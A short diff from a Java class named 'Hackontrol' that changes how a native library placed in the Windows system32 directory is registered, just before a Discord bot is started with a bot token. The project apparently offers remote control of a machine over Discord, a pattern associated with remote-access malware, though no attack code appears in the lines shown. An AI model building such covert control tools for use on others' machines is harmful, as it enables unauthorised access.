@@ -153,7 +153,7 @@ public class Hackontrol {
 		}
 
 		File libraryFile = new File(system32Directory, Hackontrol.LIBRARY_NAME);
-		Win32Library.setLibraryPath(libraryFile.getAbsolutePath());
+		Win32Library.setCopyLibraryPath(libraryFile.getAbsolutePath());
 		JDA bot = JDABuilder.createDefault(Token.BOT_TOKEN)
 				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
 				.build();
